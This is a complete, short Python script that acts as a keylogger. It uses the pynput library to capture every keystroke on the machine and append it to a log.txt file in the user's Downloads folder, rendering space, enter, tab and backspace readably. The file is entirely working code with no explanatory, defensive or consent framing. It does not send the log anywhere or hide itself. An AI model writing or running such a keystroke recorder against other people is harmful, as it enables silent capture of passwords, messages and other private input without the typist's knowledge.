import os
from pynput.keyboard import Key, Listener

# Dynamically get the Downloads folder path
downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
log_file = os.path.join(downloads_path, "log.txt")

def write_to_file(key):
    key = str(key).replace("'", "")  
    with open(log_file, "a") as f:
        if key == 'Key.space':
            f.write(" ")
        elif key == 'Key.enter':
            f.write("\n")
        elif key == 'Key.backspace':
            f.write("[BACKSPACE]")
        elif key == 'Key.tab':
            f.write("\t")
        else:
            f.write(key)

def on_press(key):
    write_to_file(key)

with Listener(on_press=on_press) as listener:
    listener.join()
